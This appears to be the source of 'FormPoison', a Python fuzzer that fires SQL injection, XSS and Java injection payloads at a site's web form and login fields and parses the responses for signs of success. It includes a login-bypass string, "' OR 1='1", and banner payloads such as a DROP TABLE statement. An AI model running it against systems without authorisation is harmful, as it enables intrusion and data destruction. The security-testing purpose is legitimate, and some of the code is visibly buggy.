import requests
import json
from rich.console import Console
from rich.table import Table
import argparse
import sys
import random
from bs4 import BeautifulSoup
import re
import os
import time
from rich.progress import Progress, BarColumn, TimeRemainingColumn
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By

skip_flag = False

def monitor_skip():
    global skip_flag  # Deklaracja globalnej flagi
    while True:
        user_input = input("Type 'skip' to move to the next field: ")
        if user_input.strip().lower() == "skip":
            skip_flag = True
            break

console = Console()

def sanitize_user_agent(user_agent):
    # Leave ASCII only
    return re.sub(r'[^\x00-\x7F]+', '', user_agent)

def show_banner():
    banner = r"""
  [bold blue]Form[/bold blue]                                 .--.
      [bold red]Poison[/bold red]                  ,-.------+-.|  ,-.
                  ,--=======* )"("")===)===* )
                              `-"---==-+-"|  `-"
                                       '--'
    """
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

    staticbanner = f"""
  {BLUE}Form{RESET}                                 .--.
      {RED}Poison{RESET}                  ,-.------+-.|  ,-.
                  ,--=======* )"("")===)===* )
                              `-"---==-+-"|  `-"
                                       '--'
              Input fields and forms injection framework.
              Developed by: https://github.com/csshark
              Note: This tool is amateur I didn't launch thousands of tests so there might be bugs.
    """

    def animate_falling_texts(texts, banner, start_line=0, end_line=3):
        banner_lines = banner.split('\n')
        max_lines = len(banner_lines) + end_line
        for text in texts:
            for i in range(start_line, max_lines):
                console.clear()
                console.print(banner)
                console.print('\n' * i + "\t" + text)
                time.sleep(0.01)

    falling_words = [
        "<script>",
        "alert(1)",
        "' OR 1=1;",
        "<audio src=x onerror=alert('XSS')>",
        "<noscript>Sorry, your browser does not support Html</noscript>",
        "<img src=x onerror=alert(1)>",
        "1=1; --",
        "<svg/onload=alert(1)>",
        "'; DROP TABLE users; --",
        "<iframe src=javascript:alert(1)>",
        "H4CK3D",
        "403 HTTP",
        "User-Agent: Fake Geco",
        "Error: "
    ]

    animate_falling_texts(falling_words, banner)
    print(staticbanner)
    print("Framework Initialization Done.")

def parse_cookies(cookie_str):
    cookies = {}
    if cookie_str:
        for pair in cookie_str.split(';'):
            if '=' in pair:
                key, value = pair.strip().split('=', 1)
                cookies[key] = value
    return cookies

def load_payloads(file_path):
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        console.print(f"[bold red]Error: Payload file '{file_path}' not found.[/bold red]")
        sys.exit(1)
    except json.JSONDecodeError:
        console.print(f"[bold red]Error: Invalid JSON in payload file '{file_path}'.[/bold red]")
        sys.exit(1)

def get_page_content(url, user_agent):
    headers = {'User-Agent': sanitize_user_agent(user_agent)}
    try:
        response = requests.get(url, headers=headers)
        return response.text
    except requests.exceptions.RequestException as e:
        console.print(f"[bold red]Error fetching page: {e}[/bold red]")
        return None

def get_string_input_fields(content):
    soup = BeautifulSoup(content, 'html.parser')
    input_fields = soup.find_all('input', {'type': ['text', 'password']})
    textareas = soup.find_all('textarea')
    return input_fields + textareas

def find_field_by_name(input_fields, field_name):
    if not field_name:
        return None

    field_name = field_name.lower()

    for field in input_fields:
        field_attrs = [
            field.get('name', '').lower(),
            field.get('id', '').lower(),
            field.get('class', '').lower(),
            field.get('placeholder', '').lower(),
            field.get('input','').lower()
        ]
        if any(field_name in attr for attr in field_attrs):
            return field

    return None  # Return None if no field is found

def detect_framework(content):
    soup = BeautifulSoup(content, 'html.parser')

    # Check for Bootstrap
    if soup.find('link', {'href': re.compile(r'bootstrap')}):
        return "Bootstrap"

    # Check for Material-UI
    if soup.find('link', {'href': re.compile(r'material-ui')}):
        return "Material-UI"

    # Check for React
    if soup.find('script', {'src': re.compile(r'react')}):
        return "React"

    # Check for Angular
    if soup.find('script', {'src': re.compile(r'angular')}):
        return "Angular"

    return "Unknown"

def analyze_response_content(content):
    content = content.lower()
    vulnerabilities = []

    # SQL Injection
    sql_errors = [
        r"sql syntax.*error",
        r"warning: mysql",
        r"unclosed quotation mark",
        r"you have an error in your sql syntax",
        r"ora-\d{5}",
        r"postgresql.*error",
        r"sql server.*error"
    ]
    for error in sql_errors:
        if re.search(error, content):
            vulnerabilities.append(f"SQL Injection (Detected: {error})")

    # XSS
    xss_patterns = [
        r"<script>",
        r"alert\(",
        r"onerror=",
        r"onload=",
        r"javascript:"
    ]
    for pattern in xss_patterns:
        if re.search(pattern, content):
            vulnerabilities.append(f"XSS (Detected: {pattern})")

    # HTML Injection
    if "<html>" in content or "<body>" in content:
        vulnerabilities.append("HTML Injection")

    # error messages
    error_messages = [
        r"error",
        r"exception",
        r"stack trace",
        r"warning"
    ]
    for message in error_messages:
        if re.search(message, content):
            vulnerabilities.append(f"Verbose Error Message (Detected: {message})")

    return vulnerabilities


def analyze_response_headers(headers):
    vulnerabilities = []

    security_headers = {
        "Content-Security-Policy": "Missing Content-Security-Policy header",
        "X-Frame-Options": "Missing X-Frame-Options header",
        "X-XSS-Protection": "Missing X-XSS-Protection header",
        "Strict-Transport-Security": "Missing Strict-Transport-Security header",
        "Referrer-Policy": "Missing Referrer-Policy header",
        "Feature-Policy": "Missing Feature-Policy header",
        "Expect-CT": "Missing Expect-CT header",
        "X-Content-Type-Options": "Missing X-Content-Type-Options header",
        "Cache-Control": "Insecure Cache-Control settings"
    }

    for header, message in security_headers.items():
        if header not in headers:
            vulnerabilities.append(message)

    if "Server" in headers:
        vulnerabilities.append(f"Server Information Leak: {headers['Server']}")
    if "X-Powered-By" in headers:
        vulnerabilities.append(f"Framework Information Leak: {headers['X-Powered-By']}")

    if "Access-Control-Allow-Origin" in headers and headers["Access-Control-Allow-Origin"] == "*":
        vulnerabilities.append("Insecure CORS Configuration: Access-Control-Allow-Origin: *")

    return vulnerabilities


def analyze_cookies(cookies):
    vulnerabilities = []

    for cookie in cookies:
        # Check Secure flag
        if not cookie.secure:
            vulnerabilities.append(f"Insecure Cookie (Missing Secure Flag): {cookie.name}")

        # Check HttpOnly flag
        if not cookie._rest.get('HttpOnly', False):  # HttpOnly is stored in _rest dictionary
            vulnerabilities.append(f"Insecure Cookie (Missing HttpOnly Flag): {cookie.name}")

        # Check SameSite attribute
        if not cookie._rest.get('SameSite', False):  # SameSite is stored in _rest dictionary
            vulnerabilities.append(f"Insecure Cookie (Missing SameSite Attribute): {cookie.name}")

    return vulnerabilities

def analyze_response(response, payload_category, payload):
    vulnerabilities = []

    content_vulns = analyze_response_content(response.text)
    vulnerabilities.extend(content_vulns)

    header_vulns = analyze_response_headers(response.headers)
    vulnerabilities.extend(header_vulns)

    cookie_vulns = analyze_cookies(response.cookies)
    vulnerabilities.extend(cookie_vulns)

    if payload_category == "SQL" and is_sql_injection_successful(response.text, payload):
        console.print("[bold red]💀 SQL INJECTED 💀[/bold red]")
    elif payload_category == "HTML" and is_xss_successful(response.text, payload):
        console.print("[bold red]💀 XSS INJECTED 💀[/bold red]")
    elif payload_category == "Java" and is_java_injection_successful(response.text, payload):
        console.print("[bold red]💀 JAVA INJECTED 💀[/bold red]")

    return vulnerabilities

def get_dynamic_form_content(url):
    """Gets the content of a dynamically generated form using Selenium."""
    driver = webdriver.Chrome()  # Make sure you have ChromeDriver installed
    driver.get(url)

    # Wait for the form to load (you can adjust the timeout)
    driver.implicitly_wait(10)

    # Get the form content
    form = driver.find_element(By.TAG_NAME, 'form')
    form_content = form.get_attribute('innerHTML')

    driver.quit()
    return form_content



def is_xss_successful(content, payload):

    if payload.lower() in content.lower():
        return True
    return False


def is_sql_injection_successful(content, payload):

    sql_errors = [
        r"sql syntax.*error",
        r"warning: mysql",
        r"unclosed quotation mark",
        r"you have an error in your sql syntax",
        r"ora-\d{5}",
        r"postgresql.*error",
        r"sql server.*error"
    ]
    for error in sql_errors:
        if re.search(error, content, re.IGNORECASE) and payload.lower() in content.lower():
            return True
    return False


def is_java_injection_successful(content, payload):
    java_errors = [
        r"java\.lang\..*Exception",
        r"NullPointerException",
        r"ClassNotFoundException",
        r"java\.io\..*Exception"
    ]
    for error in java_errors:
        if re.search(error, content, re.IGNORECASE) and payload.lower() in content.lower():
            return True
    return False


def test_input_field(url, payloads, threat_type, cookies, user_agent, input_field, verbose=False, secs=0):
    global skip_flag
    results = []

    table = Table(title=f"Input Field Test Results (User-Agent: {user_agent})")
    table.add_column("Payload", style="cyan", no_wrap=False)  # Enable text wrapping
    table.add_column("Response Code", justify="right", style="magenta")
    table.add_column("Vulnerability Detected", style="bold green")

    with Progress(
        BarColumn(bar_width=None),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeRemainingColumn(),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Testing...", total=len(payloads))

        for payload in payloads:
            if skip_flag:
                console.print(f"[bold yellow]Skipped to field: {input_field.get('name', 'input_field')}[/bold yellow]")
                skip_flag = False
                break

            try:
                headers = {'User-Agent': sanitize_user_agent(user_agent)}

                if input_field.get('type') == 'password':
                    # for password fuzzing username is filled to send complete request
                    data = {
                        'username': 'User123',  # static username
                        input_field.get('name', 'input_field'): payload['inputField']
                    }
                else:
                    # for login/username fuzzing password is filled for the same purpose as above
                    data = {
                        input_field.get('name', 'input_field'): payload['inputField'],
                        'password': 'Value1337'  # Static value for password
                    }

                response = requests.post(url, data=data, cookies=cookies, headers=headers)

                # Pass the payload category and payload to analyze_response
                vulnerabilities = analyze_response(response, payload['category'], payload['inputField'])

                results.append({
                    "payload": payload['inputField'],
                    "response_code": response.status_code,
                    "vulnerabilities": vulnerabilities
                })

                table.add_row(payload['inputField'], str(response.status_code), ", ".join(vulnerabilities))
                if verbose:
                    console.print(f"[bold blue]Testing payload: {payload['inputField']}[/bold blue]")
                    console.print(f"[bold blue]Response code: {response.status_code}[/bold blue]")
                    console.print(f"[bold blue]Vulnerabilities detected: {', '.join(vulnerabilities)}[/bold blue]")
            except requests.exceptions.RequestException as e:
                results.append({
                    "payload": payload['inputField'],
                    "response_code": "Error",
                    "vulnerabilities": [f"Request Failed: {str(e)}"]
                })
                table.add_row(payload['inputField'], "Error", f"Request Failed: {str(e)}")
                if verbose:
                    console.print(f"[bold red]Error testing payload: {payload['inputField']}[/bold red]")
                    console.print(f"[bold red]Error: {str(e)}[/bold red]")

            progress.update(task, advance=1)

            # delay flag in work:
            if secs > 0:
                time.sleep(secs)

    console.print(table)

    with open("test_results.json", "w") as f:
        json.dump(results, f, indent=4)

    console.print(f"[bold green]Test results saved to 'test_results.json'[/bold green]")




def test_login_input_fields(url, payloads, cookies, user_agent, input_fields, verbose=False,seconds=0):
    global skip_flag  # Deklaracja globalnej flagi
    results = []

    # pls work table...
    table = Table(title=f"Login Input Field Test Results (User-Agent: {user_agent})")
    table.add_column("Login Payload", style="cyan", no_wrap=False)  # Enable text wrapping
    table.add_column("Password Payload", style="cyan", no_wrap=False)  # Enable text wrapping
    table.add_column("Response Code", justify="right", style="magenta")
    table.add_column("Vulnerability Detected", style="bold green")

    login_field = None
    password_field = None
    for field in input_fields:
        name = field.get('name', '').lower()
        if 'login' in name or 'username' in name:
            login_field = field
        elif 'password' in name or 'pass' in name:
            password_field = field

    if not login_field or not password_field:
        console.print("[bold yellow]No login or password fields found for login testing.[/bold yellow]")
        return

    # logins for sql tests
    login_payloads = ["admin", "test", "user", "' OR 1='1"]

    sql_payloads = [payload['inputField'] for payload in payloads if payload['category'] == "SQL"]

    skip_thread = threading.Thread(target=monitor_skip)
    skip_thread.daemon = True
    skip_thread.start()

    with Progress() as progress:
        task = progress.add_task("[cyan]Testing login...", total=len(login_payloads) * len(sql_payloads))

        for login_payload in login_payloads:
            for password_payload in sql_payloads:
                try:
                    if skip_flag:
                        console.print(f"[bold yellow]Skipped to field {login_field.get('name', 'login')}[/bold yellow]")
                        skip_flag = False
                        break

                    headers = {'User-Agent': sanitize_user_agent(user_agent)}
                    data = {
                        login_field.get('name', 'login'): login_payload,
                        password_field.get('name', 'password'): password_payload
                    }
                    response = requests.post(url, data=data, cookies=cookies, headers=headers)

                    vulnerabilities = analyze_response(response)

                    results.append({
                        "login_payload": login_payload,
                        "password_payload": password_payload,
                        "response_code": response.status_code,
                        "vulnerabilities": vulnerabilities
                    })

                    table.add_row(login_payload, password_payload, str(response.status_code), ", ".join(vulnerabilities))
                    if verbose:
                        console.print(f"[bold blue]Testing login: {login_payload}, password: {password_payload}[/bold blue]")
                        console.print(f"[bold blue]Response code: {response.status_code}[/bold blue]")
                        console.print(f"[bold blue]Vulnerabilities detected: {', '.join(vulnerabilities)}[/bold blue]")
                except requests.exceptions.RequestException as e:
                    results.append({
                        "login_payload": login_payload,
                        "password_payload": password_payload,
                        "response_code": "Error",
                        "vulnerabilities": [f"Request Failed: {str(e)}"]
                    })
                    table.add_row(login_payload, password_payload, "Error", f"Request Failed: {str(e)}")
                    if verbose:
                        console.print(f"[bold red]Error testing login: {login_payload}, password: {password_payload}[/bold red]")
                        console.print(f"[bold red]Error: {str(e)}[/bold red]")
                progress.update(task, advance=1)

    console.print(table)

    # save results to a JSON file if selected
    with open("login_test_results.json", "w") as f:
        json.dump(results, f, indent=4)

    console.print(f"[bold green]Login test results saved to 'login_test_results.json'[/bold green]")

def save_full_response(response, payload, field_name):
    filename = f"response_{field_name}_{payload.replace('/', '_')}.txt"
    with open(filename, 'w') as f:
        f.write(f"Payload: {payload}\n")
        f.write(f"Status Code: {response.status_code}\n")
        f.write("Headers:\n")
        for header, value in response.headers.items():
            f.write(f"{header}: {value}\n")
        f.write("\nContent:\n")
        f.write(response.text)
    console.print(f"[bold green]Full response saved to '{filename}'[/bold green]")


def main():
    console.clear()
    show_banner()
    parser = argparse.ArgumentParser(description="Over 500 payloads included!")
    parser.add_argument("url", help="Form URL")
    parser.add_argument("-t", "--threat", choices=["HTML", "Java", "SQL"], help="Threat type to test (HTML, Java, SQL)")
    parser.add_argument("-p", "--payloads", default="payloads.json", help="JSON file with payloads")
    parser.add_argument("--cookies", help="Cookies: 'key1=value1; key2=value2'")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")
    parser.add_argument("--fieldname", help="Specific input field name to test (e.g., 'username')")
    parser.add_argument("--login", action="store_true", help="Enable login testing for login and password fields mode")
    parser.add_argument("-s", "--seconds", type=float, default=0, help="Delay between requests in seconds")

    if len(sys.argv) == 1:
        console.print("[bold red]Enter valid command[/bold red]")
        parser.print_help()
        sys.exit()

    args = parser.parse_args()

    if not args.url.startswith(('http://', 'https://')):
        args.url = f'https://{args.url}'
        console.print(f"[bold yellow]User has not provided security protocol. Automatically added 'https://' to the URL: {args.url}[/bold yellow]")

    # Load payloads
    payloads = load_payloads(args.payloads)
    if args.threat:
        payloads = [payload for payload in payloads if payload['category'] == args.threat]
        console.print(f"[bold green]Filtered payloads for threat type: {args.threat}[/bold green]")

    cookies = parse_cookies(args.cookies) if args.cookies else {}

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
    ]

    # Try to fetch page content with different user agents
    page_content = None
    for user_agent in user_agents:
        page_content = get_page_content(args.url, user_agent)
        if page_content:
            break  # Exit the loop if content is successfully fetched

    if not page_content:
        # If failed, try with Selenium for dynamic content
        console.print("[bold yellow]Trying to fetch dynamic content with Selenium...[/bold yellow]")
        page_content = get_dynamic_form_content(args.url)

    if not page_content:
        console.print("[bold red]Failed to fetch page content.[/bold red]")
        sys.exit()

    # framework detection
    framework = detect_framework(page_content)
    console.print(f"[bold green]Detected framework: {framework}[/bold green]")

    # Finding ALL input fields
    input_fields = get_string_input_fields(page_content)
    console.print(f"[bold green]{len(input_fields)} String input fields found[/bold green]")

    # Shuffle user agents
    random.shuffle(user_agents)

    for user_agent in user_agents:
        console.print(f"[bold green]Testing with User-Agent: {user_agent}[/bold green]")

    # Filter fields by name if provided
    filtered_fields = input_fields
    if args.fieldname:
        field = find_field_by_name(input_fields, args.fieldname)
        if field:
            filtered_fields = [field]
            console.print(f"[bold yellow]Focusing only on input field: {args.fieldname}[/bold yellow]")
        else:
            console.print(f"[bold red]No input field found with name '{args.fieldname}'[/bold red]")
            sys.exit(1)

    for input_field in filtered_fields:
        console.print(f"[bold cyan]Testing input field: {input_field.get('name', 'input_field')}[/bold cyan]")
        test_input_field(args.url, payloads, args.threat, cookies, user_agent, input_field, args.verbose, args.seconds)

    if args.login:
        console.print(f"[bold green]Testing login fields with User-Agent: {user_agent}[/bold green]")
        test_login_input_fields(args.url, payloads, cookies, user_agent, input_fields, args.verbose, args.seconds)

if __name__ == "__main__":
    main()
